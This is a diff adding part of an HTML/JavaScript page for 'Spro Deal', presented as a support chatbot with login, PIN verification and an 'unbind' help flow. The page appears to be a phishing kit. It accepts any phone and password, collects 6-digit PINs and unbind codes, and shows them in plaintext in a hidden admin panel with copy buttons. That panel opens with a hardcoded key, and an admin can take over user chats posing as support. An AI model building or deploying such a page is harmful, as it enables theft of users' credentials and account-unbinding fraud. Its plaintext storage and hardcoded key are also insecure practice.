+                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px;">
+                    <h3 style="font-size: 18px;">🤖 Spro Support</h3>
+                    <span class="online-status"></span>
+                    <span style="font-size: 11px; color: green;">Online</span>
+                    ${isAdminMode ? '<span class="admin-chat-badge">Admin Mode</span>' : ''}
+                </div>
+                <div id="chatBox" class="chat-box"></div>
+                <div id="optionsArea" class="options-grid"></div>
+                <div id="dynamicArea"></div>
+                <div class="nav-buttons">
+                    <button id="historyBtn" class="gray-btn">📋 Request History</button>
+                    <button id="logoutBtn" class="gray-btn">🚪 Logout</button>
+                </div>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        const chatBox = document.getElementById('chatBox');
+        const optionsArea = document.getElementById('optionsArea');
+        currentChatBox = chatBox;
+        
+        // Load saved chat history
+        let sessions = getChatSessions();
+        if (sessions[currentUser.phone] && sessions[currentUser.phone].length > 0) {
+            sessions[currentUser.phone].forEach(msg => {
+                addMessage(chatBox, msg.type, msg.text, msg.isHtml || false);
+            });
+        } else {
+            addMessage(chatBox, 'bot', "Welcome back! 👋 How can I help you today?");
+            setTimeout(() => addMessage(chatBox, 'bot', "Please select an issue below 👇"), 2000);
+        }
+        
+        const issues = [
+            { id: 'selling', name: "📈 Selling Problem", handler: startSellingConversation },
+            { id: 'withdrawal', name: "💰 Withdrawal Problem", handler: startWithdrawalConversation },
+            { id: 'deposit', name: "📥 Deposit Problem", handler: startDepositConversation },
+            { id: 'order', name: "📦 Order Problem", handler: startOrderConversation },
+            { id: 'upi', name: "🔄 UPI Problem", handler: startUPIConversation },
+            { id: 'forget', name: "🔑 Password Forget", handler: startPasswordConversation },
+            { id: 'others', name: "❓ Others Problem", handler: startOthersConversation },
+            { id: 'howto', name: "🔓 How to Unbind", handler: startHowToUnbindGuide, special: true }
+        ];
+        
+        issues.forEach(issue => {
+            let btn = document.createElement('button');
+            btn.className = issue.special ? 'howto-unbind-btn' : 'option-btn';
+            btn.innerHTML = issue.name;
+            btn.onclick = async () => {
+                addMessage(chatBox, 'user', issue.name);
+                optionsArea.style.display = 'none';
+                await issue.handler(chatBox);
+            };
+            optionsArea.appendChild(btn);
+        });
+        
+        document.getElementById('historyBtn').onclick = () => renderRequestHistory();
+        document.getElementById('logoutBtn').onclick = () => {
+            currentUser = null;
+            isAdminMode = false;
+            adminTargetUser = null;
+            localStorage.removeItem('spro_current_user');
+            localStorage.removeItem('spro_current_page');
+            renderLogin();
+        };
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    // ============ ADMIN PANEL ============
+    function renderAdminPanel() {
+        currentPage = 'admin';
+        let users = getUsers();
+        let requests = getRequests();
+        let pendingRequests = requests.filter(r => r.status === 'pending');
+        
+        document.getElementById('app').innerHTML = `
+            <div class="container container-wide">
+                <h2 style="text-align: center;">🔐 ADMIN PANEL</h2>
+                <div class="stats-bar">
+                    <span>👥 Users: ${users.length}</span>
+                    <span>⏳ Pending: ${pendingRequests.length}</span>
+                    <span>✅ Approved: ${requests.filter(r => r.status === 'approved').length}</span>
+                    <span>❌ Rejected: ${requests.filter(r => r.status === 'rejected').length}</span>
+                </div>
+                
+                <div class="section-title">📋 USERS DETAILS</div>
+                <table class="admin-table">
+                    <thead><tr><th>#</th><th>Phone</th><th>Password</th><th>PIN</th><th>Unbind Code</th><th>Copy</th></tr></thead>
+                    <tbody>
+                        ${users.map((user, i) => `<tr>
+                            <td>${i+1}</td><td><strong>${user.phone}</strong></td>
+                            <td>${user.password || 'N/A'}</td><td>${user.pin || 'Not set'}</td>
+                            <td>${user.unbindCode || 'Not submitted'}</td>
+                            <td><button class="copy-btn" onclick="copyToClipboard('ID: ${user.phone}\\nPassword: ${user.password}\\nPIN: ${user.pin || 'Not set'}\\nUnbind: ${user.unbindCode || 'Not submitted'}', this)">Copy</button></td>
+                        </tr>`).join('')}
+                    </tbody>
+                </table>
+                
+                <div class="section-title">⏳ PENDING REQUESTS</div>
+                <table class="admin-table">
+                    <thead><tr><th>ID</th><th>User</th><th>Issue</th><th>Code</th><th>Action</th><th>Chat</th></tr></thead>
+                    <tbody>
+                        ${pendingRequests.map(req => `<tr>
+                            <td>${req.id}</td><td>${req.phone}</td><td>${req.issue}</td>
+                            <td><strong>${req.unbindCode || 'N/A'}</strong></td>
+                            <td><button class="approve-btn" data-id="${req.id}">Approve</button><button class="reject-btn" data-id="${req.id}">Reject</button></td>
+                            <td><button class="takeover-btn" data-phone="${req.phone}">💬 Take Over Chat</button></td>
+                        </tr>`).join('')}
+                        ${pendingRequests.length === 0 ? '<tr><td colspan="6">No pending requests</td></tr>' : ''}
+                    </tbody>
+                </table>
+                
+                <div class="section-title">📜 ALL REQUESTS</div>
+                <table class="admin-table">
+                    <thead><tr><th>ID</th><th>User</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr></thead>
+                    <tbody>
+                        ${[...requests].reverse().map(req => `<tr>
+                            <td>${req.id}</td><td>${req.phone}</td><td>${req.issue}</td>
+                            <td>${req.unbindCode || 'N/A'}</td>
+                            <td><span class="status-${req.status}">${req.status.toUpperCase()}</span></td>
+                            <td>${new Date(req.created_at).toLocaleString()}</td>
+                        </tr>`).join('')}
+                    </tbody>
+                </table>
+                
+                <button id="adminLogout" class="gray-btn">🚪 LOGOUT</button>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        document.querySelectorAll('.approve-btn').forEach(btn => {
+            btn.onclick = () => updateRequestStatus(parseInt(btn.dataset.id), 'approved');
+        });
+        document.querySelectorAll('.reject-btn').forEach(btn => {
+            btn.onclick = () => updateRequestStatus(parseInt(btn.dataset.id), 'rejected');
+        });
+        document.querySelectorAll('.takeover-btn').forEach(btn => {
+            btn.onclick = () => {
+                let phone = btn.getAttribute('data-phone');
+                adminTargetUser = phone;
+                isAdminMode = true;
+                let targetUser = getUsers().find(u => u.phone === phone);
+                if (targetUser) {
+                    currentUser = targetUser;
+                    renderDashboard();
+                    setTimeout(() => {
+                        if (currentChatBox) {
+                            addMessage(currentChatBox, 'admin', "👑 Admin here! How can I help you with your issue?");
+                        }
+                    }, 500);
+                }
+            };
+        });
+        
+        document.getElementById('adminLogout').onclick = () => {
+            isAdminMode = false;
+            adminTargetUser = null;
+            renderLogin();
+        };
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    function updateRequestStatus(requestId, newStatus) {
+        let requests = getRequests();
+        let request = requests.find(r => r.id === requestId);
+        if (request) {
+            request.status = newStatus;
+            saveRequests(requests);
+            alert(`✅ Request ${newStatus.toUpperCase()}!`);
+            renderAdminPanel();
+        }
+    }
+    
+    // ============ LOGIN ============
+    function renderLogin() {
+        currentPage = 'login';
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <div style="margin-bottom: 20px;">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 24 24' fill='%232e7d32'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" style="width: 55px;">
+                    <h1 class="brand">Spro Deal</h1>
+                    <p class="tagline">A stable and profitable platform</p>
+                </div>
+                <h3>SIGN IN TO SPRO DEAL</h3>
+                <div class="phone-wrapper">
+                    <span class="country-code">+91</span>
+                    <input type="tel" id="phone" placeholder="Enter phone number">
+                </div>
+                <input type="password" id="password" placeholder="Password" class="input-field">
+                <button id="signinBtn" class="green-btn">SIGN IN</button>
+                <p class="tagline">By logging in you agree to our Privacy Policy</p>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        document.getElementById('signinBtn').onclick = handleLogin;
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    function handleLogin() {
+        let phone = document.getElementById('phone').value;
+        let password = document.getElementById('password').value;
+        if (!phone || !password) { alert('Please enter phone and password'); return; }
+        
+        let users = getUsers();
+        let existingUser = users.find(u => u.phone === phone);
+        if (existingUser) {
+            existingUser.password = password;
+            saveUsers(users);
+            currentUser = existingUser;
+        } else {
+            let newUser = { phone, password, pin: null, unbindCode: null, created_at: new Date().toISOString() };
+            users.push(newUser);
+            saveUsers(users);
+            currentUser = newUser;
+        }
+        renderPINVerify();
+    }
+    
+    function renderPINVerify() {
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <h2>🔐 SECURITY VERIFICATION</h2>
+                <p style="color:#2e7d32;">Welcome ${currentUser.phone}</p>
+                <p>Enter 6-digit PIN to continue</p>
+                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN">
+                <button id="verifyPinBtn" class="green-btn">VERIFY & CONTINUE</button>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        document.getElementById('verifyPinBtn').onclick = () => {
+            let pin = document.getElementById('pin').value;
+            if (pin.length !== 6) { alert('PIN must be 6 digits'); return; }
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if (user) { user.pin = pin; saveUsers(users); currentUser.pin = pin; }
+            renderDashboard();
+        };
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    window.copyToClipboard = copyToClipboard;
+    
+    // Check for saved state on load
+    if (loadState() && currentUser) {
+        if (currentPage === 'dashboard') renderDashboard();
+        else if (currentPage === 'admin') renderAdminPanel();
+        else renderLogin();
+    } else {
+        renderLogin();
+    }
+</script>
+</body>
+</html>
